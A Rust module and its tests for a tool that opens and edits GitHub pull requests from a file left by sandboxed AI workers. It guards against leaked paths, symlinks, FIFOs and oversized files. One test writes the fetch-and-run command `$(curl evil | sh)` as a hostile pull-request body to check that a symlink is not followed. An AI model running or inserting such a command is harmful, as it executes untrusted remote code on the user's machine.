//! The pull request a worker hands over, for kelpie to open and edit
//!
//! A worker on a repo kelpie's App covers holds a token that pushes its
//! branch and does nothing else, so `gh pr create` and `gh pr edit` fail for
//! it. It writes the pull request's title and body into a file in its build
//! folder, and kelpie opens the draft when a turn ends with the branch
//! pushed and no pull request, and sets the title and body again when a
//! later turn changed the file.
//!
//! The body goes through [`paragraphs::join`] before it is sent.

use std::fmt;
use std::path::{Path, PathBuf};

use super::Runner;
use super::paragraphs;
use crate::local_paths::Leak;
use crate::ports::ForgeError;
use crate::work_kind::work_kind;
use crate::worker_folder;

/// The file the worker writes its pull request in, in its build folder
pub(super) const FILE: &str = "pull-request.md";

/// A copy of the file as kelpie last put it on the pull request, so a turn
/// that left it alone edits nothing
const APPLIED: &str = "pull-request.applied.md";

/// Where the worker writes its pull request's text, in `build`
pub(in crate::runner) fn path(build: &Path) -> PathBuf {
    build.join(FILE)
}

/// A pull request's title and body
#[derive(Debug, Clone, PartialEq, Eq)]
pub(super) struct Text {
    pub(super) title: String,
    pub(super) body: String,
}

/// Why a file opens no pull request: its first line is no title kelpie
/// sends
#[derive(Debug, Clone, PartialEq, Eq)]
pub(super) enum Untitled {
    /// The first line is blank, which GitHub would refuse
    Blank,
    /// The first line, which is not a conventional commit subject, such as a
    /// template's first heading
    NotConventional(String),
}

/// The title and body in `file`: its first line is the title, its
/// leading `#`s left off, and the rest is the body, its soft-wrapped lines
/// joined by [`paragraphs::join`]
///
/// [`Untitled`] when the first line is blank or not a conventional commit
/// subject. Any lowercase word is a type, as [`work_kind`] reads one, since
/// the runner does not know each project's list.
pub(super) fn parse(file: &str) -> Result<Text, Untitled> {
    let file = file.trim_start();
    let (first, rest) = file.split_once('\n').unwrap_or((file, ""));
    let title = first.trim_start_matches('#').trim();
    if title.is_empty() {
        return Err(Untitled::Blank);
    }
    let summary = title
        .split_once(':')
        .is_some_and(|(_, s)| !s.trim().is_empty());
    if !summary || work_kind(title) == "untyped" {
        return Err(Untitled::NotConventional(title.to_owned()));
    }
    Ok(Text {
        title: title.to_owned(),
        body: paragraphs::join(rest.trim()),
    })
}

/// Why kelpie opened no pull request from the file
#[derive(Debug, Clone, PartialEq, Eq)]
pub(super) enum Refused {
    /// Its first line is not a conventional commit subject
    Title(String),
    /// The guard, a project's hook or the forge refused it
    Forge(ForgeError),
}

impl fmt::Display for Refused {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Title(line) => write!(
                f,
                "its first line, `{line}`, is not a conventional commit subject"
            ),
            Self::Forge(refusal) => refusal.fmt(f),
        }
    }
}

impl From<ForgeError> for Refused {
    fn from(refusal: ForgeError) -> Self {
        Self::Forge(refusal)
    }
}

/// Why a refused open reads to the worker, with how to fix it where the
/// worker can
///
/// The guard's refusal never repeats what it found, so this does not either.
pub(super) fn told(refused: &Refused) -> String {
    let refusal = match refused {
        Refused::Title(_) => {
            return format!(
                "{refused}. Write the title as the file's first line, a conventional commit \
                 subject such as `fix(parser): keep the last line`, above any template's text: \
                 a template's heading is never the title"
            );
        }
        Refused::Forge(refusal) => refusal,
    };
    match refusal {
        ForgeError::Hook { .. } => format!("{refusal}. Change the file so the hook accepts it"),
        ForgeError::LocalPath { leak, .. } => {
            let found = match leak {
                Leak::Lan => "address",
                Leak::Path => "path",
                Leak::Private => "repo name",
            };
            format!("{refusal}. Rewrite the file without the {found} it names")
        }
        _ => refusal.to_string(),
    }
}

impl Runner {
    /// Opens a draft pull request from `branch` with the text the worker left
    /// in its build folder, and returns its number
    ///
    /// `Ok(None)` when there is no file to open one from, which is told in the
    /// log. `Err` when the guard, a hook or the forge refused, also told in
    /// the log: the turn is then judged as one that opened no pull request. A
    /// first line that is not a conventional commit subject is refused too.
    pub(super) fn open_handed_over(
        &self,
        build: &Path,
        branch: &str,
        base: &str,
    ) -> Result<Option<u64>, Refused> {
        let Some(file) = self.read_handed_over(build) else {
            return Ok(None);
        };
        let text = match parse(&file) {
            Ok(text) => text,
            Err(Untitled::Blank) => {
                self.notes.push(format!(
                    "{} has no title on its first line, so no pull request is opened from it",
                    path(build).display()
                ));
                return Ok(None);
            }
            Err(Untitled::NotConventional(line)) => {
                let refused = Refused::Title(line);
                self.notes.push(format!(
                    "{}: {refused}, so no pull request is opened from it",
                    path(build).display()
                ));
                return Err(refused);
            }
        };
        let number = (self.ports.forge)
            .create_pull_request(&self.remote, branch, base, &text.title, &text.body)
            .inspect_err(|e| {
                self.notes
                    .push(format!("cannot open a pull request from {branch}: {e}"));
            })?;
        self.keep_applied(build, &file);
        Ok(Some(number))
    }

    /// Sets pull request `number`'s title and body to what the worker's file
    /// says now, when a turn changed it since kelpie last did
    ///
    /// Why, when a project's hook refused the file or its first line is not a
    /// conventional commit subject: the worker can fix its own file, so it is
    /// told. The file is not marked applied, so the next turn's end tries it
    /// again.
    pub(super) fn edit_handed_over(&self, build: &Path, number: u64) -> Option<String> {
        let file = self.read_handed_over(build)?;
        let applied = worker_folder::read(build, Path::new(APPLIED));
        if applied.is_ok_and(|applied| applied.as_deref() == Some(file.as_str())) {
            return None;
        }
        let text = match parse(&file) {
            Ok(text) => text,
            Err(Untitled::Blank) => return None,
            Err(Untitled::NotConventional(line)) => {
                let refused = Refused::Title(line);
                self.notes
                    .push(format!("cannot edit pull request #{number}: {refused}"));
                return Some(told(&refused));
            }
        };
        match (self.ports.forge).edit_pull_request(&self.remote, number, &text.title, &text.body) {
            Ok(()) => {
                self.keep_applied(build, &file);
                None
            }
            Err(e) => {
                self.notes
                    .push(format!("cannot edit pull request #{number}: {e}"));
                matches!(e, ForgeError::Hook { .. }).then(|| told(&Refused::Forge(e)))
            }
        }
    }

    // The file, or none when the worker left none. One that cannot be read,
    // or is a link or not a regular file, is told, never followed or quoted.
    fn read_handed_over(&self, build: &Path) -> Option<String> {
        worker_folder::read(build, Path::new(FILE)).unwrap_or_else(|e| {
            self.notes
                .push(format!("cannot read {}: {e}", path(build).display()));
            None
        })
    }

    fn keep_applied(&self, build: &Path, file: &str) {
        if let Err(e) = worker_folder::write(build, Path::new(APPLIED), file) {
            self.notes.push(format!(
                "cannot write {}: {e}",
                build.join(APPLIED).display()
            ));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::github::ApiError;
    use crate::ports::{Cost, Forge, Usage};
    use crate::runner::{StepReport, step};
    use crate::settings::ForgeSlug;
    use crate::test::ticket;
    use crate::test::{Asked, Rig, Scripted};

    fn usage() -> Usage {
        Usage {
            input: 1,
            cache_write: 0,
            cache_write_5m: 0,
            cache_read: 0,
            output: 1,
        }
    }

    // A running project with issue 7 in flight and its build folder made
    fn with_issue_7(app: bool) -> (Rig, std::sync::Mutex<Runner>) {
        let rig = Rig::new("shep");
        if app {
            rig.with_app();
        }
        let runner = rig.open().unwrap();
        assert_eq!(
            rig.ask(&runner, "add", Some("7"))["work_item"]["issue"],
            "7"
        );
        std::fs::create_dir_all(rig.build_7()).unwrap();
        (rig, runner)
    }

    // The env and fence the call gets are pinned in `profile`; here the
    // runner is shown handing them to the worker's call, with a token minted
    // for that call and asked for with the permission to push alone.
    #[test]
    fn on_a_repo_the_app_covers_a_workers_call_holds_a_token_that_pushes_and_nothing_more() {
        let (rig, runner) = with_issue_7(true);
        rig.claude.script([Scripted::Reply(usage(), Cost(1))]);

        step(&runner).unwrap();

        let [seen] = rig.claude.seen().try_into().unwrap();
        let fence = seen
            .call
            .reach
            .fence
            .as_deref()
            .expect("a worker is fenced");
        let minted = rig
            .github
            .asked()
            .into_iter()
            .rev()
            .find_map(|asked| match asked {
                Asked::AccessToken(_, body) => Some(body),
                _ => None,
            });
        assert_eq!(
            minted.as_deref(),
            Some(r#"{"permissions":{"contents":"write"},"repositories":["shep"]}"#)
        );
        let login = std::fs::read_to_string(rig.build_7().join("gh/hosts.yml")).unwrap();
        assert!(login.contains("oauth_token: ghs_test"), "{login}");
        assert_eq!(
            fence.env["GH_CONFIG_DIR"],
            rig.build_7().join("gh").display().to_string()
        );
        assert!(fence.no_read.contains(&"~/.config/gh/**".to_owned()));
        let instructions = std::fs::read_to_string(seen.call.instructions.unwrap()).unwrap();
        assert!(instructions.contains("pull-request.md"), "{instructions}");
        assert!(!instructions.contains("gh pr create"), "{instructions}");
    }

    #[test]
    fn with_no_app_a_worker_opens_its_own_pull_request_as_the_maintainer() {
        let (rig, runner) = with_issue_7(false);
        rig.claude.script([Scripted::Reply(usage(), Cost(1))]);

        step(&runner).unwrap();

        let [seen] = rig.claude.seen().try_into().unwrap();
        let fence = seen
            .call
            .reach
            .fence
            .as_deref()
            .expect("a worker is fenced");
        assert!(!fence.env.contains_key("GH_CONFIG_DIR"));
        assert!(!rig.build_7().join("gh").exists());
        let instructions = std::fs::read_to_string(seen.call.instructions.unwrap()).unwrap();
        assert!(instructions.contains("gh pr create"), "{instructions}");
    }

    // An App that is set but cannot mint a token now still covers the repo,
    // so the call does not start rather than run as the maintainer.
    #[test]
    fn a_worker_waits_for_its_token_rather_than_run_as_the_maintainer() {
        let (rig, runner) = with_issue_7(true);
        rig.claude.script([Scripted::Reply(usage(), Cost(1))]);
        rig.github.fail_next(ApiError::Refused(502));

        step(&runner).unwrap();

        assert!(rig.claude.seen().is_empty(), "the call started");
        // Held back, not parked: no ruling asks the maintainer, and a pause
        // later the turn starts on a token.
        let status = rig.ask(&runner, "status", None);
        assert_ne!(status["work_item"]["phase"]["state"], "ruling");
        step(&runner).unwrap();
        assert!(rig.claude.seen().is_empty(), "asked again before the pause");
        rig.clock.advance(31);
        step(&runner).unwrap();
        assert_eq!(rig.claude.seen().len(), 1, "the turn never started");
    }

    #[test]
    fn a_turn_that_pushed_with_a_file_left_and_no_pull_request_has_one_opened_for_it() {
        let (rig, runner) = with_issue_7(true);
        let file = path(&rig.build_7());
        std::fs::write(
            &file,
            "feat: x

Why.

Resolves #7
",
        )
        .unwrap();
        rig.claude.script([Scripted::Push(
            "work.txt", "work
",
        )]);

        step(&runner).unwrap();

        let status = rig.ask(&runner, "status", None);
        assert_eq!(status["work_item"]["pull_request"], 500);
        assert_eq!(
            rig.forge.text_of(500),
            Some((
                "feat: x".to_owned(),
                "Why.

Resolves #7"
                    .to_owned()
            ))
        );
        assert!(
            rig.forge.draft(500),
            "kelpie marks it ready when its gates pass"
        );
    }

    // A worker that wrapped its body at 80 columns would have it shown as a
    // narrow ragged column, since GitHub breaks a body at every newline.
    #[test]
    fn a_hard_wrapped_body_opens_the_pull_request_with_its_paragraphs_joined() {
        let (rig, runner) = with_issue_7(true);
        std::fs::write(path(&rig.build_7()), WRAPPED_FILE).unwrap();
        rig.claude.script([Scripted::Push("work.txt", "work\n")]);

        // A fixture whose paragraph was already one line would test nothing
        assert!(
            WRAPPED_FILE.contains("wrapped at\neighty columns"),
            "the fixture's paragraph must span lines for kelpie to join one"
        );

        step(&runner).unwrap();

        assert_eq!(
            rig.forge.text_of(500),
            Some((WRAPPED_TITLE.to_owned(), WRAPPED_BODY.to_owned()))
        );
    }

    // The file a worker leaves when it wrapped its body at eighty columns. Each
    // piece here is one line of the file, so its paragraph really is soft-wrapped
    const WRAPPED_FILE: &str = concat!(
        "fix(runner): join a body's lines\n",
        "\n",
        "GitHub shows every newline in a body as a line break, so a body wrapped at\n",
        "eighty columns reads as a narrow ragged column.\n",
        "\n",
        "- Kelpie joins each soft-wrapped line\n",
        "  onto the one before it\n",
        "\n",
        "Resolves #7\n",
    );

    const WRAPPED_TITLE: &str = "fix(runner): join a body's lines";

    // The same body with each paragraph and each list item on one line
    const WRAPPED_BODY: &str = concat!(
        "GitHub shows every newline in a body as a line break, so a body ",
        "wrapped at eighty columns reads as a narrow ragged column.\n",
        "\n",
        "- Kelpie joins each soft-wrapped line onto the one before it\n",
        "\n",
        "Resolves #7",
    );

    const HOME_PATH_REFUSED: &str =
        "not posted: the pull request's body names a path on this machine, which names its user";

    // A path in the maintainer's home, which the guard refuses by name.
    fn leak(rig: &Rig) -> String {
        rig.home.path().join("notes/plan.md").display().to_string()
    }

    fn prompts(rig: &Rig) -> Vec<String> {
        (rig.claude.seen().into_iter())
            .map(|seen| seen.call.prompt)
            .collect()
    }

    // The guard refuses a body naming a path that names its user. The
    // worker cannot see that, so the turn after tells it why and how to fix it.
    #[test]
    fn a_file_the_guard_refuses_is_told_to_the_worker_and_opens_once_it_is_fixed() {
        let (rig, runner) = with_issue_7(true);
        std::fs::write(
            path(&rig.build_7()),
            format!("feat: x\n\nSee {}.\n\nResolves #7\n", leak(&rig)),
        )
        .unwrap();
        rig.claude.script([Scripted::Push("work.txt", "work\n")]);

        step(&runner).unwrap(); // the turn pushes, and the body is refused

        assert_eq!(rig.forge.text_of(500), None);
        let logged = runner.lock().unwrap().take_started();
        let Some(StepReport::PullRequestNotOpened { issue, reason }) = logged.last() else {
            panic!("the refusal was not logged as a step: {logged:?}");
        };
        assert_eq!(*issue, ticket(7));
        assert_eq!(reason, HOME_PATH_REFUSED);
        std::fs::write(path(&rig.build_7()), "feat: x\n\nWhy.\n\nResolves #7\n").unwrap();
        rig.claude.script([Scripted::Say("fixed the file")]);
        step(&runner).unwrap(); // sent back with the guard's reason

        let prompts = prompts(&rig);
        let told = prompts.last().unwrap();
        assert!(told.contains("pull-request.md"), "{told}");
        assert!(told.contains(HOME_PATH_REFUSED), "{told}");
        assert!(told.contains("without the path it names"), "{told}");
        assert!(!told.contains(&leak(&rig)), "{told}");
        assert_eq!(
            rig.forge.text_of(500),
            Some(("feat: x".to_owned(), "Why.\n\nResolves #7".to_owned())),
            "opened from the fixed file"
        );
    }

    // A refusal kept past the turn it was told in would name a cause that no
    // longer holds, such as for a worker who answered a question and then
    // deleted the file.
    #[test]
    fn a_refusal_from_an_earlier_turn_is_not_told_after_the_file_is_gone() {
        let (rig, runner) = with_issue_7(true);
        std::fs::write(
            path(&rig.build_7()),
            format!("feat: x\n\nSee {}.\n\nResolves #7\n", leak(&rig)),
        )
        .unwrap();
        let asks = format!(
            "{}which file?{}",
            crate::runner::question::OPEN,
            crate::runner::question::CLOSE
        );
        rig.claude.script([Scripted::PushSay(
            "work.txt",
            "work\n",
            Box::leak(asks.into_boxed_str()),
        )]);
        step(&runner).unwrap(); // the push is refused, and the turn asks

        std::fs::remove_file(path(&rig.build_7())).unwrap();
        rig.ask(&runner, "rule", Some("7 answer go on"));
        rig.claude
            .script([Scripted::Say("done"), Scripted::Say("done")]);
        step(&runner).unwrap(); // the answered turn ends with no file
        step(&runner).unwrap(); // sent back

        let prompts = prompts(&rig);
        let told = prompts.last().unwrap();
        assert!(told.contains("no pull request"), "{told}");
        assert!(!told.contains(HOME_PATH_REFUSED), "{told}");
    }

    // The same refusal twice parks on a ruling the project manager reads.
    #[test]
    fn a_file_the_guard_keeps_refusing_parks_on_a_ruling_naming_the_refusal() {
        let (rig, runner) = with_issue_7(true);
        std::fs::write(
            path(&rig.build_7()),
            format!("feat: x\n\nSee {}.\n\nResolves #7\n", leak(&rig)),
        )
        .unwrap();
        rig.claude.script([
            Scripted::Push("work.txt", "work\n"),
            Scripted::Say("still the same"),
        ]);

        step(&runner).unwrap(); // the first turn, refused
        step(&runner).unwrap(); // sent back, and refused again
        let Some(StepReport::Failed { question, .. }) = step(&runner).unwrap() else {
            panic!("the file the guard keeps refusing did not park the item");
        };

        assert_eq!(rig.forge.text_of(500), None);
        assert!(question.contains(HOME_PATH_REFUSED), "{question}");
        assert!(!question.contains(&leak(&rig)), "{question}");
    }

    // With no App the worker opens its own pull request, as the maintainer's
    // login, and a file it left is none of kelpie's to act on.
    #[test]
    fn a_file_left_by_a_worker_the_app_does_not_cover_opens_nothing() {
        let (rig, runner) = with_issue_7(false);
        std::fs::write(path(&rig.build_7()), "feat: x\n\nResolves #7\n").unwrap();
        rig.claude.script([Scripted::Push("work.txt", "work\n")]);

        step(&runner).unwrap();

        assert_eq!(rig.forge.text_of(500), None);
        let status = rig.ask(&runner, "status", None);
        assert_eq!(status["work_item"]["pull_request"], serde_json::Value::Null);
    }

    #[test]
    fn a_turn_that_left_no_file_has_no_pull_request_opened() {
        let (rig, runner) = with_issue_7(true);
        rig.claude.script([Scripted::Push(
            "work.txt", "work
",
        )]);

        step(&runner).unwrap();

        assert_eq!(rig.forge.text_of(500), None);
    }

    // A later turn that changes the file changes the pull request, and one
    // that leaves it alone does not undo an edit made on GitHub meanwhile.
    #[test]
    fn the_title_and_body_follow_the_file_only_when_a_turn_changed_it() {
        let (rig, runner) = with_issue_7(true);
        let (build, runner) = (rig.build_7(), runner.lock().unwrap());
        rig.forge.open_pull_request(500, "kelpie/7", &[7]);
        let edit = |title: &str| {
            std::fs::write(
                path(&build),
                format!(
                    "{title}

body
"
                ),
            )
            .unwrap();
            runner.edit_handed_over(&build, 500);
        };

        edit("feat: first");
        assert_eq!(rig.forge.text_of(500).unwrap().0, "feat: first");

        let remote = ForgeSlug::try_from(Rig::REMOTE.to_owned()).unwrap();
        let theirs = ("feat: theirs", "edited on GitHub");
        rig.forge
            .edit_pull_request(&remote, 500, theirs.0, theirs.1)
            .unwrap();
        runner.edit_handed_over(&build, 500);
        assert_eq!(rig.forge.text_of(500).unwrap().0, "feat: theirs");

        edit("feat: second");
        assert_eq!(rig.forge.text_of(500).unwrap().0, "feat: second");
    }

    // A project's publish hook may refuse the text of an edit as it does a new
    // pull request's. The worker is told why, the file is not marked applied,
    // and the file once fixed is applied.
    #[test]
    fn an_edit_a_publish_hook_refuses_is_told_and_applied_once_the_file_is_fixed() {
        let rig = Rig::new("shep");
        rig.with_app();
        rig.forbid_word(&["publish"], "Acme");
        let runner = rig.open().unwrap();
        assert_eq!(
            rig.ask(&runner, "add", Some("7"))["work_item"]["issue"],
            "7"
        );
        let (build, runner) = (rig.build_7(), runner.lock().unwrap());
        std::fs::create_dir_all(&build).unwrap();
        rig.forge.open_pull_request(500, "kelpie/7", &[7]);
        let before = rig.forge.text_of(500);

        std::fs::write(path(&build), "feat: x\n\nBuilt for Acme.\n").unwrap();
        let refused = runner.edit_handed_over(&build, 500).expect("refused");
        assert!(refused.contains("forbid-word.sh"), "{refused}");
        assert!(!refused.contains("Acme"), "{refused}");
        assert_eq!(rig.forge.text_of(500), before);

        std::fs::write(path(&build), "feat: x\n\nBuilt for a customer.\n").unwrap();
        assert_eq!(runner.edit_handed_over(&build, 500), None);
        assert_eq!(
            rig.forge.text_of(500),
            Some(("feat: x".to_owned(), "Built for a customer.".to_owned()))
        );
    }

    // The worker can write its build folder, and kelpie reads and writes it as
    // the maintainer, outside the sandbox: a link there must lead nowhere.
    #[cfg(unix)]
    fn key_the_worker_must_not_reach(rig: &Rig) -> PathBuf {
        let key = rig.home.path().join("key.pem");
        std::fs::write(&key, "-----BEGIN PRIVATE KEY-----\nthe-apps-key\n").unwrap();
        key
    }

    #[cfg(unix)]
    #[test]
    fn a_file_that_links_to_a_secret_is_refused_and_nothing_is_posted() {
        let (rig, runner) = with_issue_7(true);
        let key = key_the_worker_must_not_reach(&rig);
        std::os::unix::fs::symlink(&key, path(&rig.build_7())).unwrap();
        rig.claude.script([Scripted::Push("work.txt", "work\n")]);

        step(&runner).unwrap();

        assert_eq!(rig.forge.text_of(500), None);
        let status = rig.ask(&runner, "status", None);
        assert_eq!(status["work_item"]["pull_request"], serde_json::Value::Null);
        let notes = runner.lock().unwrap().take_notes().join("\n");
        assert!(notes.contains("pull-request.md"), "{notes}");
        assert!(notes.contains("not a regular file"), "{notes}");
        assert!(!notes.contains("the-apps-key"), "{notes}");
    }

    #[test]
    #[cfg_attr(windows, ignore = "a FIFO is a Unix file")]
    fn a_file_that_is_a_fifo_or_over_the_cap_is_refused_without_hanging() {
        let (rig, runner) = with_issue_7(true);
        let (build, mut runner) = (rig.build_7(), runner.lock().unwrap());
        let file = path(&build);

        crate::test::make_fifo(&file);
        assert_eq!(
            runner.open_handed_over(&build, "kelpie/7", "main"),
            Ok(None)
        );
        runner.edit_handed_over(&build, 500);
        std::fs::remove_file(&file).unwrap();

        let two_mib = format!("feat: x\n\n{}", "y".repeat(2 << 20));
        std::fs::write(&file, two_mib).unwrap();
        assert_eq!(
            runner.open_handed_over(&build, "kelpie/7", "main"),
            Ok(None)
        );
        runner.edit_handed_over(&build, 500);

        assert_eq!(rig.forge.text_of(500), None);
        let notes = runner.take_notes();
        assert_eq!(notes.len(), 4, "{notes:?}");
        assert!(notes[0].contains("not a regular file"), "{notes:?}");
        assert!(notes[2].contains("over"), "{notes:?}");
    }

    #[cfg(unix)]
    #[test]
    fn a_copy_that_links_to_a_file_leaves_that_file_alone() {
        let (rig, runner) = with_issue_7(true);
        let (build, runner) = (rig.build_7(), runner.lock().unwrap());
        rig.forge.open_pull_request(500, "kelpie/7", &[7]);
        let rc = rig.home.path().join(".zshrc");
        std::fs::write(&rc, "export A=1\n").unwrap();
        std::os::unix::fs::symlink(&rc, build.join(APPLIED)).unwrap();
        std::fs::write(path(&build), "feat: x\n\n$(curl evil | sh)\n").unwrap();

        runner.edit_handed_over(&build, 500);

        assert_eq!(std::fs::read_to_string(&rc).unwrap(), "export A=1\n");
        assert_eq!(rig.forge.text_of(500).unwrap().0, "feat: x");
        let copy = std::fs::read_to_string(build.join(APPLIED)).unwrap();
        assert!(copy.contains("curl evil"), "{copy}");
    }

    #[test]
    fn the_first_line_is_the_title_and_the_rest_the_body() {
        let text = parse("feat(guard): scope the token\n\nWhy.\n\nResolves #420\n").unwrap();

        assert_eq!(
            text,
            Text {
                title: "feat(guard): scope the token".to_owned(),
                body: "Why.\n\nResolves #420".to_owned(),
            }
        );
    }

    #[test]
    fn a_heading_mark_and_leading_blank_lines_are_not_part_of_the_title() {
        let text = parse("\n\n# fix: a thing\nbody").unwrap();

        assert_eq!(text.title, "fix: a thing");
        assert_eq!(text.body, "body");
    }

    #[test]
    fn a_file_with_no_title_opens_nothing() {
        assert_eq!(parse(""), Err(Untitled::Blank));
        assert_eq!(parse("  \n\n##\nbody"), Err(Untitled::Blank));
    }

    #[test]
    fn a_breaking_scoped_subject_is_a_title() {
        let text = parse("feat(guard)!: scope the token\nbody").unwrap();

        assert_eq!(text.title, "feat(guard)!: scope the token");
    }

    #[test]
    fn a_first_line_that_is_not_a_conventional_commit_subject_is_no_title() {
        for line in ["## Short summary", "feat:", "feat: ", "Feat: x"] {
            let title = line.trim_start_matches('#').trim().to_owned();
            assert_eq!(
                parse(&format!("{line}\nbody")),
                Err(Untitled::NotConventional(title)),
                "{line}"
            );
        }
    }

    // A worker that filled the repo's template straight into the file has its
    // first heading on the first line, as shep's `## Short summary`.
    const TEMPLATE: &str = "## Short summary\n\nWhy.\n\nResolves #7\n";

    #[test]
    fn a_template_heading_on_the_first_line_opens_nothing_and_the_worker_is_told() {
        let (rig, runner) = with_issue_7(true);
        std::fs::write(path(&rig.build_7()), TEMPLATE).unwrap();
        rig.claude.script([Scripted::Push("work.txt", "work\n")]);

        step(&runner).unwrap(); // the turn pushes, and the title is refused

        assert_eq!(rig.forge.text_of(500), None);
        let logged = runner.lock().unwrap().take_started();
        let Some(StepReport::PullRequestNotOpened { issue, reason }) = logged.last() else {
            panic!("the refusal was not logged as a step: {logged:?}");
        };
        assert_eq!(*issue, ticket(7));
        assert!(reason.contains("`Short summary`"), "{reason}");
        std::fs::write(path(&rig.build_7()), format!("feat: x\n\n{TEMPLATE}")).unwrap();
        rig.claude.script([Scripted::Say("fixed the file")]);
        step(&runner).unwrap(); // sent back with the reason

        let prompts = prompts(&rig);
        let told = prompts.last().unwrap();
        assert!(told.contains("pull-request.md"), "{told}");
        assert!(told.contains("`Short summary`"), "{told}");
        assert!(told.contains("conventional commit subject"), "{told}");
        let (title, body) = rig.forge.text_of(500).expect("opened from the fixed file");
        assert_eq!(title, "feat: x");
        assert!(body.starts_with("## Short summary"), "{body}");
    }

    #[test]
    fn a_title_that_stays_unconventional_parks_on_a_ruling_naming_the_reason() {
        let (rig, runner) = with_issue_7(true);
        std::fs::write(path(&rig.build_7()), TEMPLATE).unwrap();
        rig.claude.script([
            Scripted::Push("work.txt", "work\n"),
            Scripted::Say("still the same"),
        ]);

        step(&runner).unwrap(); // the first turn, refused
        step(&runner).unwrap(); // sent back, and refused again
        let Some(StepReport::Failed { question, .. }) = step(&runner).unwrap() else {
            panic!("the title that stays unconventional did not park the item");
        };

        assert_eq!(rig.forge.text_of(500), None);
        assert!(question.contains("`Short summary`"), "{question}");
        assert!(
            question.contains("conventional commit subject"),
            "{question}"
        );
    }

    #[test]
    fn an_edit_to_an_unconventional_title_is_refused_and_applied_once_fixed() {
        let (rig, runner) = with_issue_7(true);
        let (build, runner) = (rig.build_7(), runner.lock().unwrap());
        rig.forge.open_pull_request(500, "kelpie/7", &[7]);
        let before = rig.forge.text_of(500);

        std::fs::write(path(&build), "Summary\n\nbody\n").unwrap();
        let refused = runner.edit_handed_over(&build, 500).expect("refused");
        assert!(refused.contains("`Summary`"), "{refused}");
        assert_eq!(rig.forge.text_of(500), before);

        std::fs::write(path(&build), "fix: y\n\nbody\n").unwrap();
        assert_eq!(runner.edit_handed_over(&build, 500), None);
        assert_eq!(
            rig.forge.text_of(500),
            Some(("fix: y".to_owned(), "body".to_owned()))
        );
    }
}
